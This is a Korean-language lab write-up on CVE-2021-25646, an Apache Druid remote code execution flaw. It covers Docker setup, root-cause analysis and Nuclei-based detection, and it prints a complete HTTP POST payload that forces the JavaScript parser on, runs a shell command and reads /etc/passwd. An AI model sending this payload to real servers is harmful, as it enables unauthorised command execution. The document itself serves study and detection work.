# CVE-2021-25646: Apache Druid 원격 코드 실행 (Remote Code Execution)

## 취약점 개요

**Apache Druid**는 대량의 데이터를 실시간으로 수집하고 분석하는 오픈 소스 분산 데이터 스토어입니다. **CVE-2021-25646** 취약점은 Apache Druid의 **JavaScript 기능**에서 발생합니다.

-----

## 참고 자료:

  - [https://paper.seebug.org/1476/](https://paper.seebug.org/1476/)
  - [https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E](https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E)
  - [http://www.openwall.com/lists/oss-security/2021/01/29/6](http://www.openwall.com/lists/oss-security/2021/01/29/6)
  - [https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E](https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E)
  - [https://nvd.nist.gov/vuln/detail/CVE-2021-25864](https://nvd.nist.gov/vuln/detail/CVE-2021-25864)
  - [https://hub.docker.com/r/vulhub/apache-druid](https://hub.docker.com/r/vulhub/apache-druid)
  - [https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646](https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646)

-----

## 취약점 실습 환경 구축

이 실습은 Docker를 사용하여 취약한 Apache Druid 환경을 구축합니다.

1.  **취약한 환경 설정:**

      * Docker Compose를 이용하여 취약한 버전인 Apache Druid 0.20.0을 실행합니다.
      *명령어를 실행하면 백그라운드에서 서버가 시작됩니다.

    <!-- end list -->

    ```bash
    docker compose up -d
    ```

2.  **접속속:**
      * 컨테이너가 실행된 후, 웹 브라우저에서 `http://localhost:8888`에 접속하여 Apache Druid의 초기 페이지를 확인할 수 있습니다.

![druid_setup.png](img/druid_setup.png)

---

## 취약점 상세 분석 (In-depth Analysis)

Apache Druid는 기본적으로 보안을 위해 사용자 제공 JavaScript 코드 실행 기능(`druid.javascript.enabled`)을 비활성화(false) 하고 있습니다.

하지만 이 취약점은 `/druid/indexer/v1/sampler`라는 API 엔드포인트에 특정 JSON 요청을 보내면, 서버의 비활성화 설정을 무시하고 JavaScript 파서를 강제로 활성화시킬 수 있다는 점을 악용합니다. 공격자는 이 파서의 `function` 필드에 악성 코드를 삽입하여 서버에서 원하는 명령을 실행하게 됩니다.

핵심은 `parseSpec` 객체 내부에 `"":{"enabled":"true"}`와 같이 이름이 없는(empty-key) 파라미터를 추가하여 설정을 덮어쓰는 부분입니다.

-----

## 취약점 공격

이 취약점은 HTTP **POST** 요청을 통해 악의적인 JavaScript 코드를 전송하여 원격 명령을 실행합니다.

1.  **요청청:**
    * 아래와 같은 HTTP **POST** 요청을 `http://your-ip:8888/druid/indexer/v1/sampler` 경로로 보냅니다.
    * 요청 본문(body)의 `function` 필드 안에 원하는 셸 명령어를 삽입합니다. 예시에서는 `id` 명령어를 실행하여 현재 사용자 정보를 확인합니다.

    <!-- end list -->

    ```http
    POST /druid/indexer/v1/sampler HTTP/1.1
    Host: your-ip:8888
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en-US;q=0.9,en;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
    Connection: close
    Cache-Control: max-age=0

    {
        "type":"index",
        "spec":{
            "ioConfig":{
                "type":"index",
                "firehose":{
                    "type":"local",
                    "baseDir":"/etc",
                    "filter":"passwd"
                }
            },
            "dataSchema":{
                "dataSource":"test",
                "parser":{
                    "parseSpec":{
                    "format":"javascript",
                    "timestampSpec":{

                    },
                    "dimensionsSpec":{

                    },
                    "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                    "":{
                        "enabled":"true"
                    }
                    }
                }
            }
        },
        "samplerConfig":{
            "numRows":10
        }
    }
    ```

2.  **공격 결과:**

      * 요청에 대한 응답으로 **`id`** 명령어의 실행 결과가 포함된 JSON 데이터를 받게 됩니다. 이를 통해 원격 코드 실행에 성공했음을 확인할 수 있습니다.

-----

## Nuclei를 이용한 자동화된 검증

제공된 Nuclei 템플릿을 사용하여 이 취약점을 자동화된 방식으로 탐지할 수 있습니다.

##### **Nuclei 템플릿 동작 원리**

제공된 `CVE-2021-25646.yaml` 템플릿은 다음 조건들이 **모두 충족**될 때 취약하다고 판단합니다.

  * **Request Logic:**

      * `/etc/passwd` 파일의 내용을 읽는 악성 페이로드를 `POST /druid/indexer/v1/sampler` 경로로 전송합니다.

  * **Match Logic (`matchers-condition: and`):**

    1.  **`status: 200`**: HTTP 응답 코드가 `200 OK`인지 확인합니다.
    2.  **`header: application/json`**: 응답 헤더에 `application/json`이 포함되어 있는지 확인합니다.
    3.  **`regex: "root:.*:0:0:"`**: 응답 본문에 `passwd` 파일의 대표적인 패턴인 `root:...:0:0:` 문자열이 있는지 정규식으로 검사합니다. **이것이 탐지의 핵심 증거입니다.**
    4.  **`words: "numRowsRead", "numRowsIndexed"`**: 응답 본문에 Druid가 정상적으로 데이터를 처리했음을 나타내는 키워드가 있는지 확인하여 탐지 정확도를 높입니다.

## Nuclei Template URL : [CVE-2021-25646](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25646.yaml)

## Nuclei Command :

```bash
nuclei -u http://localhost:8888 -id CVE-2021-25646 -vv
```

![detection_nuclei.png](img/detection_nuclei.png)
